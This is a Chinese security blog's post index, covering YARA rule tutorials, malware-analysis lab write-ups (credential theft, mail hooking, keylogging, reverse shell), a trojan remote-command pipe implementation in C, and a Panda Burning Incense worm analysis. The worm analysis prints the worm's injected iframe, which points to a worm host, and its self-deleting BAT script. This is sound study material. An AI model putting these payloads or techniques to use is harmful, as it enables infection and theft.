$a&#125; 在测试文件中，改成大写的字符串 成功检出 宽字符串wide可以用于搜索宽字符串 1234567rule TestWide&#123; strings: $a = &quot;this is a test&quot; wide condition: $a&#125; 写一个小DEMO，定义一个宽字符串 12wchar_t a[] = L&quot;this is a test&quot;;printf(&quot;%ws\\n&quot;, a); 成功检出 如果想同时搜索ASCII和宽字节字符串，可以将ascii和wide结合起来 1234567rule TestWideAndAscii&#123; strings: $a = &quot;this is a test&quot; wide ascii condition: $a&#125; 在test.txt中写入this is a test，可以检测出宽字符的exe和ascii的txt 异或字符串xor可以用于搜索字符串的单字节xor结果，比如以下规则可以搜索“this is a test”的每个字符的异或。 1234567rule TestXor&#123; strings: $a = &quot;this is a test&quot; xor condition: $a&#125; 在test.txt中写入“dxyc0yc0q0ducd”，这是“this is a test”每个字符与0x10异或后的结果。 成功检出 上面这个逻辑是等价于 12345678910rule test&#123; strings: $a = &quot;dxyc0yc0q0ducd&quot;// this is a test 异或0x10结果 $b = &quot;fz&#123;a2&#123;a2s2fwaf&quot;// this is a test 异或0x12结果 $c = &#123;8b 97 96 8c df 96 8c df 9e df 8b 9a 8c 8b&#125; //this is a test 异或0xFF结果 condition: any of them&#125; 也可以将wide和ascii结合使用 12345678rule testXorAsciiWide&#123; strings: $a = &quot;this is a test&quot; xor wide ascii condition: $a&#125; 从yara3.11开始，可以控制异或的范围，如下所示。 1234567rule TestXor&#123; strings: $a = &quot;this is a test&quot; xor(0x01-0x10) condition: $a&#125; Base64字符串base64可以用于搜索被base64编码过后的字符串，以下规则将搜索“this is a test”base64编码后的结果。 1234567rule testBase64&#123; strings: $a = &quot;this is a test&quot; base64 condition: $a&#125; this is a testbase64编码后结果是：dGhpcyBpcyBhIHRlc3Q= base64wide是搜索宽字符 搜索完整词fullword该修饰符保证字符串仅出现在由非字母数字字符分隔的文件中时才匹配。 1234567rule testFullword&#123; strings: $a = &quot;b1ackie&quot; fullword condition: $a&#125; 这种时候，比如iamb1ackie和 www.b1ackieblog.com 都是不匹配的，但是可匹配 www.b1ackie.cn 和 www.b1ackie-blog.com 正则表达式正则表达式是yara最强大的功能之一，它们的定义方式与文本字符串相同，使用正斜杠而不是双引号括起来。 1234567rule test&#123; strings: $a = /md5: [0-9a-fA-F]&#123;32&#125;/ condition: $a &#125; 也可以在正则表达式中使用文本修饰符，nocase、ascii、wide和fullword。 正则表达式还可以识别以下元字符 \\ 引用下一个元字符 ^ 匹配文件的开头 $ 匹配文件的结尾 | 交替 () 分组 [] 带括号的字符类 也可以使用以下量词 * 匹配0次或多次 + 匹配1次或多次 ? 匹配0或1次 {n} 完全匹配n次 {n,} 至少匹配n次 {,m} 最多匹配n次 {n,m} 匹配n到m次 这些量词还有一个非贪婪的变体，后面跟一个问号（？） *? 匹配0次或多次，非贪婪 +? 匹配1次或多次，非贪婪 ?? 匹配0或1次，非贪婪 {n}? 完全匹配n次，非贪婪 {n,}? 至少匹配n次，非贪婪 {,m}? 最多匹配n次，非贪婪 {n,m}? 匹配n到m次，非贪婪 字符序列 \\w 匹配一个单词字符（字母数字加_） \\W 匹配一个非单词字符 \\s 匹配一个空白字符 \\S 匹配一个非空白字符 \\d 匹配一个十进制数字字符 \\D 匹配一个非数字字符 私有字符串yara中的所有字符串都可以标记为private，这意味着它们将永远不会出现在yara的输出之中，当使用-s参数时也无法看到回显。 1234567rule test&#123; strings: $a = &quot;asd&quot; private condition: $a &#125; 参考https://yara.readthedocs.io/en/v4.1.2/index.html https://www.yuque.com/p1ut0/qtmgyx/eubd9v#4CpNb https://bbs.pediy.com/thread-226011.htm#msg_header_h3_15","categories":[{"name":"YARA","slug":"YARA","permalink":"https://b1ackie.cn/categories/YARA/"}],"tags":[{"name":"YARA","slug":"YARA","permalink":"https://b1ackie.cn/tags/YARA/"},{"name":"恶意代码检测","slug":"恶意代码检测","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"}]},{"title":"恶意代码分析实战-实验11","slug":"恶意代码分析实战-实验11","date":"2021-09-07T07:59:01.000Z","updated":"2021-09-08T09:08:42.886Z","comments":true,"path":"2021/09/07/恶意代码分析实战-实验11/","link":"","permalink":"https://b1ackie.cn/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/","excerpt":"","text":"Lab 11-1详细分析使用火绒剑监控行为，可以看到其向当前的目录下释放了一个Dll文件。 IDA查看，可以看到很明显的从资源节中释放文件 之后会进行注册表的相关操作。 可以看到在HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon下创建了一个键值GinaDLL，值是释放的DLL的路径。 打开DLL文件，查看其导出表，可以看到大量的Wlx开头的函数，由此可以判断出这是一个GINA拦截，窃取用户登录凭证。 通过查看字符串可以看到一个msutil32.sys，仔细查看发现，是创建此文件，然后向其中写一些数据，写入的数据是什么需要继续往外分析，查看传入的参数。 可以看到写入的数据，是一个结构体的相关信息。而这就是登录账户的信息。 123456typedef struct _WLX_MPR_NOTIFY_INFO &#123; PWSTR pszUserName;//登录账户名称 PWSTR pszDomain;//登录域名称 PWSTR pszPassword;//密码 PWSTR pszOldPassword;//旧密码&#125; WLX_MPR_NOTIFY_INFO, *PWLX_MPR_NOTIFY_INFO; 1.这个恶意代码向磁盘释放了什么？释放了一个msgina32.dll文件。 2.这个恶意代码如何进行驻留？设置注册表，成为winlogon的一员。 3.这个恶意代码如何窃取用户登录凭证？GINA拦截用户登录信息 4.这个恶意代码对窃取的证书做了什么处理？将其保存到msutil32.sys文件中。 5.如何在你的测试环境下让这个恶意代码获得用户凭证？需要先重启，启动拦截，然后注销系统，再次登录时，信息就会被记录。 Lab 11-2详细分析使用IDA打开DLL，看到DLL main函数。 首先会尝试打开C:\\Windows\\system32\\Lab11-02.ini这个文件，可以看到模式是打开存在的文件 然后会读取文件中的数据，这是读取到的数据。 解密算法，解密出数据&#x62;&#x69;&#108;&#108;&#x79;&#x40;&#x6d;&#97;&#108;&#x77;&#97;&#114;&#x65;&#x61;&#110;&#97;&#108;&#x79;&#x73;&#105;&#115;&#x62;&#111;&#111;&#x6b;&#46;&#99;&#x6f;&#x6d;，是一个邮箱地址。 然后会进行比较当前运行的是否是THEBAT.EXE、OUTLOOK.EXE、MSIMN.EXE这三个程序，如果是的话会执行下面的三个函数 之后会获取send函数的地址，来进行inline hook HOOK函数，关于inline hook的相关知识可以查看这里，inline hook inline hook前 inline hook后 查看HOOK后的jmp地址，这个函数检测send中发送的数据如果含有RCPT TO:，会加入一个新的RCPT TO: &#x62;&#105;&#x6c;&#x6c;&#x79;&#64;&#x6d;&#x61;&#108;&#119;&#x61;&#x72;&#101;&#x61;&#x6e;&#x61;&#108;&#x79;&#x73;&#x69;&#x73;&#98;&#111;&#111;&#107;&#x2e;&#x63;&#x6f;&#109;，RCPT TO是收件人的意思，也就是发送的所有邮件都会被发送到恶意的邮箱去。 DLL还有一个导出函数install，可以看到是设置了一个键值。分析是在HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows下的AppInit_DLLs中设置了spoolvxx32.dll，这个键值的作用是当前所有加载user32.dll的程序都会再次加载此键值中的dll。之后会将自身复制到system32目录下。 但是实际测试中发现并没有实现，原因是在XP中这样可以实现，而在win7中不行。 win7需要按照如图中设置，即可实现DLL的注入。 1.这个恶意DLL导出了什么？导出了一个install函数 2.使用rundll32.exe安装这个恶意代码后，发生了什么？会将自身复制到system32目录下，还会设置HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows下的AppInit_DLLs，这会实现DLL的注入。 3.为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？根据上面分析可知必须放在system32目录下。 4.这个安装的恶意代码如何驻留？HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows下的AppInit_DLLs在这个键值中写入DLL的路径，可以实现持久化驻留。 5.这个恶意代码采用的用户态Rootkit技术是什么？inline hook 6.挂钩代码做了什么？修改了send函数，所有向外发送包含RCPT TO：几个字符的邮件会被额外添加一行，发送给恶意账户。 7.哪个或者哪些进程执行了这个恶意攻击，为什么？THEBAT.EXE、OUTLOOK.EXE、MSIMN.EXE，查询发现，它们都是邮件进程 8..ini文件的意义是什么？存储机密过后的恶意电子邮件地址，用来读取解密。 9.你怎样用wireshark动态抓取这个恶意代码的行为？可以查看与邮件相关的数据包来进行分析。 Lab 11-3此实验最好在XP中进行，win7运行没有cisvc.exe。 详细分析分析程序，可以看到首先复制了文件，之后调用了sub401070 然后经过分析是将一段shellcode注入到cisvc.exe中。 之后就是执行了CMD命令，net start cisvc 可以通过工具看到注入前后的入口点明显发生了变化 分析shellcode发现主要是调用了恶意DLL中的函数zzz69806582 分析DLL，查看这个导出函数看到它创建了一个新的线程。 继续分析新线程，打开发现其创建了一个互斥量防止重复运行，然后创建一个C:\\WINDOWS\\System32\\kernel64x.dll文件，然后是键盘记录功能。记录在创建的文件之中。 记录的一些信息 1.使用基础的静态分析过程，你可以发现什么有趣的线索？可以看到其中的字符串和一些API，字符串有cmd.exe猜测其启用了cmd，DLL中的导入表有GetAsyncKeyState，猜测可能有键盘记录。 2.当运行这个恶意代码时，发生了什么？会进行键盘的记录 3.Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？将其复制在了system32目录下，然后还向cisvc.exe注入了shellcode，使其加载恶意DLL的导出函数实现键盘记录。 4.这个恶意代码感染windows系统的哪个文件？cisvc.exe 5.Lab11-03.dll做了什么？创建了dll文件，在其中进行键盘记录 6.这个恶意代码将收集的数据存放在何处？C:\\WINDOWS\\System32\\kernel64x.dll之中","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"}]},{"title":"恶意代码分析实战-实验9","slug":"恶意代码分析实战-实验9","date":"2021-09-01T08:22:24.000Z","updated":"2021-09-07T03:31:58.052Z","comments":true,"path":"2021/09/01/恶意代码分析实战-实验9/","link":"","permalink":"https://b1ackie.cn/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/","excerpt":"","text":"Lab 9-1详细分析打开程序，首先看到判断当前程序是否带了参数，如果带了参数，就进行后面的操作，如果没有带参数，会尝试打开一个键值，如果不存在此键值，则程序自删除，如果存在就会开始和服务器端通信，这些后面再说。 之后会进行判断，首先判断当前输入的最后一个参数是否等于abcd。 然后就是判断输入的第一个参数是什么，-in,-re,-c,-cc。 -in-in参数，首先创建了一个系统服务 然后将自身复制到system32下 然后创建注册表表项，并且设置键值 恶意代码安装的服务 设置的键值 -re-re参数是删除配置信息，将服务删除，复制的文件删除，注册表信息也清空。 刚才创建的键值已经被删除 -c-c参数是设置自己的配置信息，根据-c后面的四个参数进行设置 输入1 2 3 4 -cc-cc 是打印当前的配置信息 打印出来的信息 如果参数不符合要求都会进行自删除 后门不带任何参数，且有配置信息的情况下，会执行连接服务器，并且根据服务器指令执行操作。 获取注册表中的配置信息 指令共有五种，分别是sleep，upload，download，CMD，nothing sleep会执行sleep函数 upload是下载一个文件 download发送内容 CMD会执行一个命令 nothing什么都不做 1.如何让这个恶意代码安装自身？从上数分析可以知道，需要使用-in选项。 2.这个恶意代码的命令行选项是什么？它要求的密码是什么？命令行选项有四种,-in,-re,-c,-cc密码是abcd 3.如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码修改跳转条件即可，这只是其中的一种方法，将JNZ修改为JMP。 4.这个恶意代码基于系统的特征是什么？本地创建的名为Lab9-01的服务，还创建了一个XPS表项，其中的键值是连接所需的参数。 5.这个恶意代码通过网络命令执行了哪些不同操作？上述分析已经分析清楚。 6.这个恶意代码是否有网络特征？有网络的连接，域名是http://www.practicalmalwareanalysis.com Lab 9-2详细分析程序的整体流程比较简单。 首先程序会进行比较，比较当前运行的程序是否是ocl.exe 然后会在401089函数中进行解密，是一个异或解密。 解密后的域名 之后会连接域名，然后会调用401000，在其中创建了一个进程 1.在二进制文件中，你看到的静态字符串是什么？只能看到这些字符串 2.当你运行这个二进制文件时，会发生什么？不会发生什么，应该是会创建一个CMD进程。 3.怎样让恶意代码的攻击负载（payload）获得运行？将名字改为ocl.exe 4.在地址0x00401133处发生了什么？将一些数据赋值给一个地址，主要是为了隐藏字符串，这也是为什么刚才字符串窗口并没有什么有用的信息，shellcode的编写手法之一，可以参考shellcode学习 5.传递个子例程（函数）0x00401089的参数是什么？是这两个参数，其中一个是加密的字符串 另一个是用来进行异或解密的数据 6.恶意代码使用的域名是什么？www.practicalmalwareanalysis.com 7.恶意代码使用什么编码函数来混淆域名？异或 8.恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？这块用书上的话来说是一个反向的SHELL， 书上的原话： 1STARTUPINFO结构中的标准流被设置为一个套接字。这直接绑定套接字和cmd.exe的标准流，所以cmd.exe被启动后，所有经过套接字的数据都将发送到cmd.exe，并且cmd.exe产生的所有输出都将通过套接字发出。 这里我并没有分析出来，就借用了书上的解答。 Lab 9-3详细分析整体流程也是比较简单的，可以看到首先是调用了三个DLL中的函数，然后是writefile函数向某文件写入数据。 运行DLL主要会打印出这三行信息，下面来仔细分析一下到底做了什么。 DLL1先来看看第一个DLL。 可以看到这是DLL1Print函数，其中dword_10008030就是打印的数据，可以查看交叉引用，看看究竟是什么。 可以看到这个值是当前进程的PID DLL2再来看第二个DLL，这是导出函数 DLL2Print，看到dword_1000B078是其打印的数据，还是交叉引用查看。 可以看到是这个数据是创建文件的句柄。 而另一个导出函数DLL2ReturnJ可以看到返回了一个值，从上图可以看到这个值就是文件的句柄。 DLL3DLL3有两个导出函数 DLL3Print打印信息，可以看到是&amp;WideCharStr，交叉引用查看。 可以看到这是MultiByteToWideChar函数的一个参数，而这个参数作用是 12lpMultiByteStr指向要转换的字符串的指针。 这个函数作用是将字符串映射到 UTF-16（宽字符）字符串，也就是&amp;WideCharStr这其中保存着转为宽字符后的数据的地址。 导出函数DLL3GetStructure返回了一个值，从上图可以看出，这里其实是返回了一个结构体的地址。 1.Lab9-3.exe导入了哪些DLL？导入了四个DLL 2.DLL1.dll、DLL2.dll、DLL3.dll要求的基址是多少？都是10000000 3.当使用OD调试时，为DLL1.dll、DLL2.dll、DLL3.dll分配的基址是什么？分别是200000,、210000、220000 4.当调用DLL1.dll中的一个导入函数时，这个导入函数都做了些什么？打印出了当前的进程的PID 5.当调用writefile函数时，写入的文件名是什么？temp.txt 6.当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？从DLL3中的DLL3GetStructure获取 7.在运行或调试时，会看到程序打印出三块神秘数据。DLL1.dll、DLL2.dll、DLL3.dll它们的神秘数据分别什么？前面详细分析可知，第一个是当前进程的PID，第二个是文件句柄，第三个是保存着宽字符数据的地址。 8.如何将DLL2.dll加载到IDA PRO中，使得它与OD使用的加载地址匹配？可以在IDA里Edit–&gt;Segments–&gt;Rebase Program改变基址","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"}]},{"title":"shellcode的分析调试小技巧","slug":"shellcode的分析调试小技巧","date":"2021-08-31T10:37:14.000Z","updated":"2021-08-31T10:57:23.656Z","comments":true,"path":"2021/08/31/shellcode的分析调试小技巧/","link":"","permalink":"https://b1ackie.cn/2021/08/31/shellcode%E7%9A%84%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7/","excerpt":"","text":"分析shellcodeOD有一种简单的分析shellcode的方法。 第一步首先是复制shellcode 这里我用自己写的弹窗小程序，并且使用十六进制编辑器WINHEX进行复制。 第二步然后是打开OD，附加任意一个程序，打开内存映射窗口，快捷操作就是上面的M，然后寻找类型为Priv的内存区域（这是分配给进程的私有内存，与只读的可执行镜像不同，这些内存被多个进程共享），选择它。 第三步选中一大片区域，然后将复制的数据粘贴进去 可以右键选择反汇编，这样就会显示汇编代码，而不是十六进制数据，复制后如图所示。 第四步在反汇编窗口中跳到地址，可以在上面图中看到首地址是12D000，那么在反汇编窗口中跳到此地址，然后选择设置为新的EIP，这样就就可以开始调试shellcode了。 调试到弹窗的地方 这样可以方便调试shellcode，感觉还是很方便的。 参考《恶意代码分析实战》","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"shellcode","slug":"shellcode","permalink":"https://b1ackie.cn/tags/shellcode/"}]},{"title":"功能技术远程CMD","slug":"功能技术远程CMD","date":"2021-08-30T07:26:03.000Z","updated":"2021-08-30T08:27:29.101Z","comments":true,"path":"2021/08/30/功能技术远程CMD/","link":"","permalink":"https://b1ackie.cn/2021/08/30/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF%E8%BF%9C%E7%A8%8BCMD/","excerpt":"","text":"远程CMDCMD，提示进行命令输入的一种工作提示符，在windows系统下，相当于在windows窗口使用的DOS系统，简单来讲，CMD就是通过命令行实现键鼠的操作。 现在介绍的远程CMD是指病毒木马获取控制端发送过来的CMD命令，执行后将结果回传给控制端。 有许多的API都可以实现CMD命令，比如WinExec,CreateProcess但是这些函数不能获取执行后的操作结果。所以实现远程CMD的关键是获取CMD的执行结果，接下来介绍如何执行CMD，并通过匿名管道的方法获取执行结果，实现远程CMD。 函数介绍CreatePipe创建一个匿名管道，并从中得到读写管道的句柄。 123456BOOL CreatePipe( PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize); 参数hReadPipe：返回一个刻度管道数据的文件句柄。 hWritePipe：返回一个可写管道数据的文件句柄。 lpPipeAttributes：传入一个SECURITY_ATTRIBUTES结构的指针，该结构决定此函数返回的句柄是否可由子进程继承。如果传入为NUL，则不可进程。 nSize：指向管道的缓冲区大小。但是这仅仅是一个理想值，系统根据这个值创建大小相近的缓冲区。如果传入0，那么系统将使用一个默认的缓冲区大小。 返回值如果函数成功，则返回值不为0； 如果函数失败，则返回值为0。 实现原理管道是一种在进程间共享数据的机制，其实质是一段共享内存。windows系统为这段共享的内存设计使用数据流I/O的方式来访问。一个进程读，另一个进程写，这类似一个管道的两端。实现远程CMD的流程如下： 首先初始化匿名管道的安全属性结构SECURITY_ATTRIBUTES，调用CreatePipe函数创建匿名管道，获取管道数据读取句柄和管道数据写入句柄。 对即将创建的进程结构体STARTUPINFO进行初始化，隐藏进程窗口，并把上面的管道数据写入句柄赋值给新进程控制台窗口的缓存句柄，这样，新进程会把窗口缓存的输出数据写入到匿名管道中。 调用CreateProcess函数创建新的进程，执行CMD命令，并调用WaitForSingleObject等待命令执行完毕。执行完毕后，就调用ReadFile函数根据匿名管道的数据读取句柄从匿名管道的缓冲区中读取数据，这个数据就是命令的返回结果。 最后便可以关闭句柄，释放资源。 编码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;BOOL PipeCmd(char* pszCmd, char* pszResultBuffer, DWORD dwBufferSize);int main()&#123; //执行的CMD命令 char pszCmd[] = &quot;ping www.baidu.com&quot;; char pszResultBuffer[1024] = &#123; 0 &#125;; DWORD dwBufferSize = 1024; if (PipeCmd(pszCmd, pszResultBuffer, dwBufferSize) == TRUE) &#123; printf(&quot;执行成功:\\n%s\\n&quot;,pszResultBuffer); &#125; else &#123; printf(&quot;执行失败\\n&quot;); &#125; system(&quot;pause&quot;); return 0;&#125;BOOL PipeCmd(char* pszCmd, char* pszResultBuffer, DWORD dwBufferSize)&#123; HANDLE hReadPipe = NULL; HANDLE hWritePipe = NULL; SECURITY_ATTRIBUTES SEA = &#123; 0 &#125;; BOOL bRet = FALSE; STARTUPINFO si = &#123; 0 &#125;; PROCESS_INFORMATION pi = &#123; 0 &#125;; //设定管道的安全属性 SEA.bInheritHandle = TRUE; SEA.nLength = sizeof(SEA); SEA.lpSecurityDescriptor = NULL; //创建匿名管道 bRet = CreatePipe(&amp;hReadPipe, &amp;hWritePipe, &amp;SEA, 0); if (bRet == FALSE) &#123; printf(&quot;创建管道失败\\n&quot;); return bRet; &#125; //设置新进程的参数 si.cb = sizeof(si); si.hStdError = hWritePipe; si.hStdOutput = hWritePipe; si.wShowWindow = SW_HIDE; si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //创建新进程执行CMD命令 bRet = CreateProcess(NULL, pszCmd, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi); if (bRet == FALSE) &#123; printf(&quot;创建进失败\\n&quot;); return bRet; &#125; //等待执行结束 WaitForSingleObject(pi.hThread, INFINITE); WaitForSingleObject(pi.hProcess, INFINITE); //从匿名管道中读取结果到输出缓冲区 RtlZeroMemory(pszResultBuffer, dwBufferSize); ReadFile(hReadPipe, pszResultBuffer, dwBufferSize, NULL, NULL); //关闭句柄 CloseHandle(pi.hThread); CloseHandle(pi.hProcess); CloseHandle(hWritePipe); CloseHandle(hReadPipe); return bRet;&#125; 测试执行Ping baidu的命令，查看效果","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"功能技术","slug":"功能技术","permalink":"https://b1ackie.cn/tags/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF/"}]},{"title":"熊猫烧香病毒分析","slug":"熊猫烧香病毒分析","date":"2021-08-19T06:00:54.000Z","updated":"2021-08-26T04:43:57.211Z","comments":true,"path":"2021/08/19/熊猫烧香病毒分析/","link":"","permalink":"https://b1ackie.cn/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/","excerpt":"","text":"前言熊猫烧香做为非常经典的病毒之一，可以说已经被分析烂了，网上也有许许多多的分析流程。作为病毒分析的一个初学者，我现在也尝试分析一下熊猫烧香，争取能够分析的比较清楚， 也能够学到一些东西。 样本信息样本的基本信息 行为分析使用Process Monitor监控行为 可以看到panda.exe向C:\\Windows\\System32\\drivers文件夹下释放了一个文件spcolsv.exe 启动了spcolsv.exe这个进程 然后病毒的主体panda.exe将自身关闭 spcolsv.exe进程中有大量的文件操作 查看注册表的set操作，看到病毒在图中两个路径下设置了键值。 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run与自启动相关，病毒在其中设置键值，实现自启动。 HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\CheckedValue这个键值主要是是否显示隐藏文件，当它为0时候，就是不显示隐藏的文件。 查看电脑上的文件时，会发现图标都被改成了熊猫烧香的图标。 现在大致清理一下思路，病毒主体为panda.exe，打开后，它会释放一个spcolsv.exe到C:\\Windows\\System32\\drivers文件夹下，然后关闭自身，启动spcolsv.exe。spcolsv.exe有大量的文件操作，应该是和修改图标有关，同时还通过设置注册表键值，实现了自启动，和不显示隐藏的文件。 动态分析首先进入函数，是两个解密的函数，解密后进行比较，如果字符串不相等就会退出程序。那么可以看到，病毒的实际操作就是在比较之后的三个函数内，操作1,2,3，现在具体进入其中进行分析。 操作1在这里主要是病毒的主体程序的运行和被感染的EXE程序的运行。 病毒主体panda.exe和spcolsv.exe流程判断当前病毒运行的目录下是否存在一个Desktop.ini文件，如果存在会将其删除。 继续往下走，会判断当前的程序是否是C:\\Windows\\system32\\drives\\spcolsv.exe，如果不是还会判断当前是否存在这个进程spcolsv.exe，如果存在将其关闭。 然后将自身复制到C:\\Windows\\system32\\drives\\spcolsv.exe，运行spcolsv.exe，再退出当前进程。 下面来看一下如果是被感染的EXE文件会有哪些操作。 被感染的EXE文件如果是一个被感染的EXE文件，那么在这里进行了文件结尾的读取，一个文件被感染的话，结尾会多出一段数据 被感染文件结尾的标识 如果此时是一个被感染的EXE文件，此时比较的结果如下图所示。 被感染文件，在这里会进行跳转，可以看到此时eax值是文件结尾标识的大小，结尾标识如上图，0x17=23。 之后会创建一个原文件名后面加上.exe的文件 然后会在C:\\Users\\admin\\AppData\\Local\\Temp下创建一个BAT文件，并且执行这个BAT文件，并且判断当前是否存在spcolsv.exe进程，存在的话将其关闭，然后会将病毒文件分离出来，复制到C:\\Windows\\system32\\drives\\spcolsv.exe，然后运行它，自身退出。 执行这个BAT文件。 查看bat文件的内容 12345678:try1del &quot;C:\\1\\aaa.exe&quot;if exist &quot;C:\\1\\aaa.exe&quot; goto try1ren &quot;C:\\1\\aaa.exe.exe&quot; &quot;aaa.exe&quot;if exist &quot;C:\\1\\aaa.exe.exe&quot; goto try2&quot;C:\\1\\aaa.exe&quot;:try2del %0 总结操作1到这里基本就结束了，panda.exe会将自身复制到驱动目录下，命名为spcolsv.exe，然后以spcolsv.exe继续运行。如果是被感染的exe文件，会先创建一个BAT文件，用于执行原程序，然后将病毒主体分离出来，继续运行。只要当前电脑上还存在一个被感染的exe文件，那么病毒就永远不会被清除。 操作2进入操作2，其中有三个函数，分开来看这三个函数。 函数1，sub_40A7EC这里创建了一个线程 下断分析这里，这里获取了所有的磁盘，然后开始进行感染。 getDriveType（sub_4076B4)函数，遍历所有的盘符，从A到Z，然后保存起来，以便后续进行感染。 感染函数中，开始进行文件的搜索，搜索当前盘符下所有的文件，比如C盘，就是C:\\*.*，关于文件搜索的一些内容可以查看这里文件遍历。 如果是文件夹的话还要进行判断，排除了一些系统的目录，本身目录和上级目录”.”，”..”。 然后会判断当前目录中是否存在desktop.ini文件，如果不存在则会创建一个，向其中写入年月日。 存在的话就会判断其中的时间是否与当前时间相等，如果相等，则判断当前文件已经被感染就会跳过，如果不相等则继续感染，修改文件中的时间。 然后就是对于文件的操作，判断文件的类型执行相应的操作。如果是.GHO文件，也就是备份文件，就会将其删除。 获取文件的大小，如果文件大小超过0xA00000就不再继续感染，如果文件名字是setup.exe和NTDETECT.COM也不进行感染。 获取扩展名然后判断是否等于exe,scr,pid,com，如果是这几种文件类型就会执行40800C函数进行感染。 然后是网页类型文件是否是htm，html，asp，php，jsp，aspx，如果是这几种类型就会执行407ADC函数进行感染。 现在来着重看一下可执行文件与网页文件的感染方式。 网页文件感染方式（sub_407ADC）对于这类文件主要是在原文件的后面加上一个新的标签，其感染过程如下，它会读取文件内容，然后通过比较文件内容，看当前文件是否已经存在感染的标签判断其是否被感染过 之后会进行感染，在文件的末尾加上一个iframe标签 1&lt;iframe src=http://www.krvkr.com/worm.htm width=0 height=0&gt;&lt;/iframe&gt; 感染后的文件内容 可执行文件感染方式（sub_40800C）首先是判断当前程序是否正在运行，如果正在运行的话，就不感染，然后读取文件内容，比对感染标志WhBoy判断是否已经被感染，如果已经被感染的话，就不再进行感染。感染过程是将病毒复制进被感染程序之中，修改图标，在末尾再加上一个感染标志。 感染标志 感染前后文件大小对比 感染后的文件大小等于原文件大小加上病毒大小（60.5kb）。 函数2，sub_40C5B0这个函数创建了一个定时器，每隔6S就执行一次。 首先还是获取了所有的磁盘。 然后是判断当前根目录下是否存在setup.exe这个文件，如果不存在将病毒主体复制过去并命名为setup.exe，如果存在的话又会读取spcolsv.exe和setup.exe的内容，判断是否相同，也就是判断setup.exe是不是病毒程序，如果不相等会将原setup.exe删除再重新复制一个。都满足的话继续后续的操作。 然后是对于autorun.inf的判断，也是先判断根目录下是否存在这个文件，如果不存在创建并写入内容，如果存在比对内容是否为病毒生成的内容，如果不是，则删除原始的，生成一个新的。流程与setup.exe基本上是一样的。 autorun.inf的内容 最后会调用SetFileAttributesA函数将两个文件的属性设置为隐藏。 函数3，sub_40BD08这个函数也是创建了一个线程，是循环创建了好几次，下断分析查看。 进来分析查看，其是创建了SOCKET通信，通过139和445端口感染局域网的共享文件夹。 这里我没有设置好环境，没有实现局域网感染，所以分析的可能不是很到位。 